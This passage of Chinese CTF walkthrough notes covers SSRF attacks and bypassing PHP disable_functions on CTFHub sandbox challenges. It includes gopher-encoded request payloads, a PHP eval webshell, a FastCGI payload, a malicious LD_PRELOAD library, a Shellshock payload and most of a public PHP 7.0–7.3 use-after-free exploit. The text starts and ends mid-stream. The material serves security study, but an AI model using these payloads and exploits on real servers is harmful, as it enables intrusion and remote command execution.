代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。\n\ntftp:// – 基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机。\n\ngopher:// – 是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。\n```\n\n## 16.3 端口扫描\n\n```\nhttp://xxxx/?url=127.0.0.1:8000\n题目会给端口号范围，用burpsuite爆破端口号\n```\n\n## 16.4 POST请求\n\n> 这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年 \n>\n> http://challenge-06817def2881c17e.sandbox.ctfhub.com:10800/?url=_\n\n打开什么都没有，尝试一下10.1的内网访问\n\n> http://challenge-06817def2881c17e.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php\n\n查看源码发现信息：\n\n```html\n<form action=\"/flag.php\" method=\"post\">\n<input type=\"text\" name=\"key\">\n<!-- Debug: key=0dc2b8bce30276f8d0f0cb1472eb6c7d-->\n</form>\n```\n\n是一个表单，要用POST方式提交key到flag.php上。因为要发送的不是php代码所以不能用php://input方式，但可以用gopher协议(curl支持gopher伪协议)。\n\n```\ngopher://ip:port/_payload(注意有下划线)\n```\n\n构造POST内容，特别要注意Content-Length应为key的整个长度。将内容拿去URL编码2次(按理说是3次，但我们是在URL上构造，最后一次编码按回车浏览器会自动帮我们第3次编码)，第一次URL编码后要手动在所有%0A前面加上%0D(%0A是在linux系统中代表换行符，在windows中是%0D0A代表换行符，但是网上的编码器大都是编码的%0A，所以我们需要改成windows能够识别的)，再进行后续编码。\n\n```\nPOST /flag.php HTTP/1.1\nHost: 127.0.0.1:80\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 36\n\nkey=0dc2b8bce30276f8d0f0cb1472eb6c7d\n```\n\n```\n//第1次URL编码\nPOST%20/flag.php%20HTTP/1.1%0AHost%3A%20127.0.0.1%3A80%0AContent-Type%3A%20application/x-www-form-urlencoded%0AContent-Length%3A%2036%0A%0Akey%3D0dc2b8bce30276f8d0f0cb1472eb6c7d\n//加上%0D\nPOST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0A%0D%0Akey%3D0dc2b8bce30276f8d0f0cb1472eb6c7d\n//第2次URL编码\nPOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D0dc2b8bce30276f8d0f0cb1472eb6c7d\n//构造URL\n/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D0dc2b8bce30276f8d0f0cb1472eb6c7d\n```\n\n## 16.5 上传文件\n\n> 这次需要上传一个文件到flag.php了.祝你好运\n\n题目提示有flag.php，先打开看看\n\n```\nhttp://challenge-1897762186ae66ce.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php\n```\n\n发现有上传文件的接口，但没有提交按钮。那就自己做一个。\n\n```html\n<input type=\"submit\" value=\"提交\">\n```\n\n直接这样提交一句话木马的话会出现\n\n>  Just View From 127.0.0.1 \n\n那我们抓一个包来用gopher构造\n\n```\nPOST /flag.php HTTP/1.1\nHost: 127.0.0.1\nContent-Type: multipart/form-data; boundary=---------------------------1114439304559070182630578745\nContent-Length: 287\n\n-----------------------------1114439304559070182630578745\nContent-Disposition: form-data; name=\"file\"; filename=\"shell1.php\"\nContent-Type: application/octet-stream\n\n<?php \necho \"hello world\";\neval($_POST['caidao']); ?>\n-----------------------------1114439304559070182630578745--\n```\n\n进行两次URL编码\n\n```\n//第1次\nPOST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20multipart/form-data%3B%20boundary%3D---------------------------1114439304559070182630578745%0D%0AContent-Length%3A%20287%0D%0A%0D%0A-----------------------------1114439304559070182630578745%0D%0AContent-Disposition%3A%20form-data%3B%20name%3D%22file%22%3B%20filename%3D%22shell1.php%22%0D%0AContent-Type%3A%20application/octet-stream%0D%0A%0D%0A%3C%3Fphp%20%0D%0Aecho%20%22hello%20world%22%3B%0D%0Aeval%28%24_POST%5B%27caidao%27%5D%29%3B%20%3F%3E%0D%0A-----------------------------1114439304559070182630578745--\n//第2次\nPOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------1114439304559070182630578745%250D%250AContent-Length%253A%2520287%250D%250A%250D%250A-----------------------------1114439304559070182630578745%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522shell1.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520%250D%250Aecho%2520%2522hello%2520world%2522%253B%250D%250Aeval%2528%2524_POST%255B%2527caidao%2527%255D%2529%253B%2520%253F%253E%250D%250A-----------------------------1114439304559070182630578745--\n//构造URL\n/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------1114439304559070182630578745%250D%250AContent-Length%253A%2520287%250D%250A%250D%250A-----------------------------1114439304559070182630578745%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522shell1.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520%250D%250Aecho%2520%2522hello%2520world%2522%253B%250D%250Aeval%2528%2524_POST%255B%2527caidao%2527%255D%2529%253B%2520%253F%253E%250D%250A-----------------------------1114439304559070182630578745--\n```\n\n```\nctfhub{58dfbf57568807f03726d88b}\n```\n\n## 16.6 FastCGI协议\n\ngopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议。\n\nFastCGI协议分析\n\nhttps://blog.csdn.net/mysteryflower/article/details/94386461\n\n方法一：利用脚本\n\nhttps://blog.csdn.net/qq_51652864/article/details/118697060\n\n监听端口\n\n```\nnc -lvvp 9000 > 1.txt \t//监听的内容写到1.txt去\n```\n\n方法二：利用gopherus\n\nGopherus安装\n\n```\ngit clone https://github.com/tarunkant/Gopherus\n```\n\n去到Gopherus目录，利用fastcgi\n\n```\npython gopherus.py --exploit fastcgi\n```\n\n填入`/var/www/html/index.php `和`whoami`，获得payload\n\n```\nif you don't know press ENTER we have default one:  /var/www/html/index.php  \nTerminal command to run:  whoami\n\nYour gopher link is ready to do SSRF:                 \ngopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\n```\n\n## 16.7 URL Bypass\n\nurl跳转bypass：\n1.利用`?`绕过限制url=https://www.baidu.com?www.xxxx.me\n2.利用`@`绕过限制url=https://www.baidu.com@www.xxxx.me\n3.利用斜杠反斜杠绕过限制\n4.利用`#`绕过限制url=https://www.baidu.com#www.xxxx.me\n5.利用子域名绕过\n6.利用畸形url绕过\n7.利用跳转ip绕过 \n\n> 请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧\n\n给出提示，url参数的值中必须包含有http://notfound.ctfhub.com\n可以采用@，也就是 HTTP 基本身份认证绕过。\nHTTP 基本身份认证允许 Web 浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式。\n也就是：http://www.xxx.com@www.yyy.com形式\n\n```\n/?url=http://notfound.ctfhub.com@127.0.0.1/flag.php\n```\n\n## 16.8 数字IP Bypass\n\n- IP进制转换：将点分十进制的IP格式转为其他【八进制】【十六进制】等格式\n\n```\nhttp://127.0.0.1  >>>  http://0177.0.0.1/\nhttp://127.0.0.1  >>>  http://2130706433/\nhttp://127.0.0.1  >>>  http://127001/\nhttp://192.168.0.1  >>>  http://3232235521/\nhttp://192.168.1.1  >>>  http://3232235777/\n```\n\n- Enclosed Alphanumerics：由英文字母数字组成的Unicode字符集，位于圆圈，括号或其他未封闭的封闭空间内，或以句号结尾。如下\n\n```\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com\n①②⑦.⓿.⓿.①  >>> 127.0.0.1\n```\n\n- 特殊地址\n\n```\nhttp://0/  # 0.0.0.0可以直接访问到本地\nhttp://127。0。0。1  # 绕过后端正则规则\nhttp://localhost/\n```\n\n> 这次ban掉了127以及172，不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢 \n\n首先看看http://challenge-36ebaf025673bdcd.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php\n\n> hacker! Ban '/127|172|@/'\n\n说过滤了127，172还有@，经过验证， 以下url值也都可以绕过爆出flag\n\n```\nhttp://0x7f000001/flag.php\nhttp://localhost/flag.php\nhttp://2130706433/flag.php\nhttp://0/flag.php\nhttp://localhost/flag.php\n```\n\n## 16.9 302跳转 Bypass\n\n如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，这个时候可以尝试使用302跳转的方式来进行绕过。\n\n**xip.io**\n\nWhat is xip.io?\nxip.io is a magic domain name that provides wildcard DNS\nfor any IP address. Say your LAN IP address is 10.0.0.1.\nUsing xip.io,即以如下规则进行域名解析\n\n    10.0.0.1.xip.io   resolves to   10.0.0.1\n    www.10.0.0.1.xip.io   resolves to   10.0.0.1\n    mysite.10.0.0.1.xip.io   resolves to   10.0.0.1\n    foo.bar.10.0.0.1.xip.io resolves to 10.0.0.1\n\n**短网址**\n\n顾名思义就是在形式上比较短的网址，借助短网址您可以用简短的网址替代原来冗长的网址，让使用者可以更容易的分享链接。\n\n访问短网址会自动跳转到原来冗长的网址，利用短网址这个特性，我们可以绕过URL参数检测的黑名单。\n\n```\n# 短网址工具域名： https://www.985.so/\nhttp://127.0.0.1/flag.php ---> http://r6d.cn/b2mk6\n```\n\n> SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧。\n\n依旧尝试一下http://challenge-5b889e8b9c4e4f67.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php\n\n>  hacker! Ban Intranet IP \n\n它说把`127.0.0.1`都给过滤了，所以用`.xip.io`不行，但用短网址与10.8的某些地址就可以轻松绕过。\n\n## 16.10 DNS重绑定攻击\n\n{% asset_img 后端服务器IP过滤.png 后端服务器IP过滤 %}\n\n根据流程图：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。\n\n但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定攻击。我们利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可。\n\n要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL（TTL表示DNS记录在DNS服务器上缓存时间）时间为0，这是为了防止有DNS服务器对第一次的解析结果进行缓存。\n\n完整的DNS重绑定攻击流程为：\n\n1. 服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP\n2. 对于获得的IP进行判断，发现为指定范围IP，则通过验证\n3. 接下来服务器端对URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址\n4. 由于已经绕过验证，所以服务器端返回访问内网资源的内容\n\n设置好两个地址，就会自动生成域名\n\n```\n# 工具域名： https://lock.cmpxchg8b.com/rebinder.html\n# 使用两个IP地址，分别为\n163.177.151.109 # 作用：第一次DNS解析后IP判断在指定范围内（随意一个可访问的公网地址）\n127.0.0.1       # 作用：第二次DNS解析，不用判断直接访问内网flag.php\n\n7f000001.a3b1976d.rbndr.us\n```\n\n抓包，将url改为域名，就得flag。\n\n```\nGET /?url=7f000001.a3b1976d.rbndr.us/flag.php HTTP/1.1\n```\n\n# 17.  Bypass disable_function \n\nPHP 的 disabled_functions主要是用于禁用一些危险的函数防止被一些攻击者利用。有四种绕过 disable_functions 的手法：\n\n- 攻击后端组件，寻找存在命令注入的 web 应用常用的后端组件，如ImageMagick 的魔图漏洞、bash 的破壳漏洞等等；\n- 寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；\n- mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制（让特定扩展名的文件直接和php-cgi通信）；\n- 利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。\n\n在学习php时，发现有许多函数会对网站或系统造成很大危险隐患，常见的危险函数有：\n\n```php\nphpinfo()\n功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。\n危险等级：中\n\npassthru()\n功能描述：允许执行一个外部程序并回显输出，类似于 exec()。\n危险等级：高\n\nexec()\n功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。\n危险等级：高\n\nsystem()\n功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。\n危险等级：高\n\nchroot()\n功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式\nPHP 时才能工作，且该函数不适用于 Windows 系统。\n危险等级：高\n\nscandir()\n功能描述：列出指定路径中的文件和目录。\n危险等级：中\n\nchgrp()\n功能描述：改变文件或目录所属的用户组。\n危险等级：高\n\nchown()\n功能描述：改变文件或目录的所有者。\n危险等级：高\n\nshell_exec()\n功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。\n危险等级：高\n\nproc_open()\n功能描述：执行一个命令并打开文件指针用于读取以及写入。\n危险等级：高\n\nproc_get_status()\n功能描述：获取使用 proc_open() 所打开进程的信息。\n危险等级：高\n\nerror_log()\n功能描述：将错误信息发送到指定位置（文件）。\n安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode，\n执行任意命令。\n危险等级：低\n\nini_alter()\n功能描述：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。\n具体参见 ini_set()。\n危险等级：高\n\nini_set()\n功能描述：可用于修改、设置 PHP 环境配置参数。\n危险等级：高\n\nini_restore()\n功能描述：可用于恢复 PHP 环境配置参数到其初始值。\n危险等级：高\n\ndl()\n功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。\n危险等级：高\n\npfsockopen()\n功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。\n危险等级：高\n\nsyslog()\n功能描述：可调用 UNIX 系统的系统层 syslog() 函数。\n危险等级：中\n\nreadlink()\n功能描述：返回符号连接指向的目标文件内容。\n危险等级：中\n\nsymlink()\n功能描述：在 UNIX 系统中建立一个符号链接。\n危险等级：高\n\npopen()\n功能描述：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。\n危险等级：高\n\nstream_socket_server()\n功能描述：建立一个 Internet 或 UNIX 服务器连接。\n危险等级：中\n\nputenv()\n功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。\n危险等级：高\n```\n\n\n\n## 17.1 LD_PRLOAD\n\nLD_PRELOAD可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。**通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。**一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。\n\n> 我们知道，Linux的用的都是glibc，有一个叫libc.so.6的文件，这是几乎所有Linux下命令的动态链接中，其中有标准C的各种函数。对于GCC而言，默认情况下，所编译的程序中对标准C函数的链接，都是通过动态链接方式来链接libc.so.6这个函数库的。\n\n程序中我们经常要调用一些外部库的函数，以sendmail程序中的geteuid()为例，如果我们有个自定义的geteuid()函数，把它编译成动态库后，通过LD_PRELOAD加载，当程序中调用geteuid()函数时，调用的其实是我们自定义的geteuid()函数。而在PHP中error_log()和mail()函数在传入特定参数时都会调用到sendmail外部程序进而调用外部库的函数geteuid()。\n\n所以我们的思路是：在已获得webshell但被PHP的disable_function禁用了一些危险函数的命令执行的情况下\n\n1. 编写好动态链接库文件并上传到服务器\n2. 编写PHP文件并上传到服务器，内容为：\n   利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径，然后 配合php的某个函数（例如error_log()或mail()函数）去触发运行动态链接库然后执行我们的恶意动态链接库文件\n3. 在浏览器去浏览我们写的PHP文件\n\n例：hcfhub-web进阶-Bypass disable_function-LD_PRLOAD\n\n打开链接页面显示\n\n```php+html\nCTFHub Bypass disable_function —— LD_PRELOAD\n本环境来源于AntSword-Labs\n\n<!DOCTYPE html>\n<html>\n<head>\n    <title>CTFHub Bypass disable_function —— LD_PRELOAD</title>\n</head>\n<body>\n<h1>CTFHub Bypass disable_function —— LD_PRELOAD</h1>\n<p>本环境来源于<a href=\"https://github.com/AntSwordProject/AntSword-Labs\">AntSword-Labs</a></p>\n</body>\n</html>\n<?php\n@eval($_REQUEST['ant']);\nshow_source(__FILE__);\n?>\n```\n\n即在本页面上就放了一句话木马，用蚁剑连接。在根目录发现flag，但打开是空白页面，终端命令执行也不行。还有一个readflag，打开发现是执行显示flag的命令`tac /flag`，终端执行也不行。\n\n> tac命令与cat命令展示内容相反，用于将文件**以行为单位**的反序输出，即第一行最后显示，最后一行先显示，且不能带行输出。 \n\n方法一：用蚁剑插件的LD_PRLOAD模式\n\nhttps://blog.csdn.net/hxhxhxhxx/article/details/112759999?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.essearch_pc_relevant&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.essearch_pc_relevant\n\n方法二：手工绕过\n\n```http\n//查看禁用了哪些函数\nhttp://challenge-f10324543e937194.sandbox.ctfhub.com:10800/?ant=phpinfo();\n```\n\n发现禁用了mail函数，但没禁用error_log()。所以下面利用error_log()绕过LD_PRLOAD。\n\n```php\nerror_log()函数向服务器错误记录、文件或远程目标发送错误信息。\nerror_log(message,type,destination,headers);\n```\n\n先创建一个havefun.c文件\n\n```c\n#include<stdlib.h>\n#include <stdio.h>        \n#include<string.h> \n \nvoid payload(){\n\tsystem(\"/readflag > /tmp/havefun\");\n    //如果/readflag运行成功将会在/tmp目录下生成一个havefun文件\n    //system(\"tac /flag > /tmp/havefun\");\n}   \n \nint geteuid(){\nif(getenv(\"LD_PRELOAD\") == NULL)\n    return 0;\nunsetenv(\"LD_PRELOAD\");\npayload();\n}\n```\n\n编译成havefun.so文件\n\n```\ngcc -fPIC -shared havefun.c -o havefun.so\n```\n\n将havefun.so文件拖入/tmp目录下，创建一个havefun.php拖入/var/www/html目录下。\n\n```php\n<?php\nputenv(\"LD_PRELOAD=/tmp/havefun.so\");\nerror_log(\"\",1,\"\",\"\");\n//mail(\"\",\"\",\"\",\"\");\n?>\n//因为mail()函数不能用，所以用函数error_log()\n```\n\n现在所有的前提工作都做好了，关键是怎么执行havefun.php让它执行havefun.so再执行/readflag命令。很简单，主页面不是有一个$_REQUEST['ant']吗，我们可以利用文件包含，将havefun.php文件包含在主页面，执行主页面就可执行havefun.php。\n\n```\nhttp://challenge-f10324543e937194.sandbox.ctfhub.com:10800/?ant=include('havefun.php');\n```\n\n执行完后会在/tmp目录下生成一个havefun文件，打开就是flag。\n\n## 17.2 ShellShock\n\n例：hcfhub-web进阶-Bypass disable_function-ShellShock\n\n跟LD_PRLOAD一样的界面，用蚁剑连接即可。发现什么目录都不给我们看，只能看/var/www/html的目录。\n\n方法一：用蚁剑插件的apache_mode_cgi模式\n\n点击开始，自动弹出终端。查找flag。\n\n```\n/readflag\ntac /flag\n```\n\n方法二：手工shellshock\n\n创建一个shell.php文件上传到/var/www/html\n\n```php\n<?php\nputenv(\"PHP_hack=() { :; }; tac /flag > /var/www/html/hack.php\");\n//运行成功的话将会在/var/www/html下生成一个hack.php文件，里面装着flag。因为我们只能看到/var/www/html目录下的东西，所以只能把flag放在这个路径下。\nerror_log(\"\",1,\"\",\"\");\n//mail(\"\",\"\",\"\",\"\");\n//这次没有限制禁用mail(),所以用mail()也可。\n?>\n```\n\n执行shell.php\n\n```\nhttp://challenge-6a758e43b272dbba.sandbox.ctfhub.com:10800/shell.php\n```\n\n发现/var/www/htm目录下会生成一个hack.php。\n\n## 17.3 Apache Mod CGI\n\nCGI简单说来便是放在服务器上的可执行程序,CGI编程没有特定的语言,C语言,linux shell,perl,vb等等都可以进行CGI编程。\n\nMOD_CGI：任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。\n\n例：hcfhub-web进阶-Bypass disable_function-Apache Mod CGI\n\n这个好像只能用插件？跟shellshock套路一样。\n\n## 17.4 PHP-FPM\n\n> 由于FPM默认监听的是9000端口,我们就可以绕过webserver,直接构造fastcgi协议，和fpm进行通信.于是就有了利用 webshell 直接与 FPM通信 来绕过 disable functions.\n> 因为前面我们了解了协议原理和内容,接下来就是使用cgi协议封装请求,通过socket来直接与FPM通信\n> 但是能够构造fastcgi，就能执行任意PHP代码吗?答案是肯定的,但是前提是我们需要突破几个限制：\n>\n> 1. 第一个问题\n>    既然是请求,那么SCRIPT_FILENAME就相当的重要,因为前面说过,fpm是根据这个值来执行php文件文件的,如果不存在,会直接返回404,所以想要利用好这个漏洞,就得找到一个已经存在的php文件,好在一般进行源安装php的时候,服务器都会附带上一些php文件,如果说我们没有收集到目标web目录的信息的话,可以试试这种办法.\n> 2. 第二个问题\n>    我们再如何构造fastcgi和控制SCRIPT_FILENAME,都无法做到任意命令执行,因为只能执行目标服务器上的php文件.\n>    那要如何绕过这种限制呢? 我们可以从php.ini入手.它有两个特殊选项,能够让我们去做到任意命令执行,那就是auto_prepend_file\n>    auto_prepend_file的功能是在在执行目标文件之前，先包含它指定的文件,这样的话,就可以用它来指定php://input进行远程文件包含了.这样就可以做到任意命令执行了.\n> 3. 第三个问题\n>    进行过远程文件包含的小伙伴都知道,远程文件包含有allow_url_include这个限制因素的,如果没有为ON的话就没有办法进行远程文件包含,那要怎末设置呢?\n>    FPM是有设置PHP配置项的KEY-VALUE的,PHP_VALUE可以用来设置php.ini,PHP_ADMIN_VALUE则可以设置所有选项.这样就解决问题了。\n\n例：hcfhub-web进阶-Bypass disable_function-PHP-FPM\n\n一样用蚁剑连接，用蚁剑插件fastcgi/php-fpm，地址选择本地的9000端口，点击开始，就会在/var/www/html下生成一个.antproxy.php文件，在蚁剑添加数据，路径加上.antproxy.php，连接成功就可找flag。\n\n## 17.5 GC UAF\n\n方法一：蚁剑插件PHP_GC_UAF\n\n方法二：一样用蚁剑连接，将编写好的exploit.php上传到/var/www/html上。\n\n编写脚本exploit.php\n\n```php\n<?php\n\n# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=72530\n#\n# This exploit should work on all PHP 7.0-7.3 versions\n#\n# Author: https://github.com/mm0r1\n\npwn(\"tac /flag\");#这个写命令\n\nfunction pwn($cmd) {\n    global $abc, $helper;\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    class ryat {\n        var $ryat;\n        var $chtg;\n        \n        function __destruct()\n        {\n            $this->chtg = $this->ryat;\n            $this->ryat = 1;\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if you get segfaults\n\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_repeat('A', 79);\n\n    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:\"ryat\":2:{s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;}}i:1;i:3;i:2;R:5;}';\n    $out = unserialize($poc);\n    gc_collect_cycles();\n\n    $v = [];\n    $v[0] = ptr2str(0, 79);\n    unset($v);\n    $abc = $out[2][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, 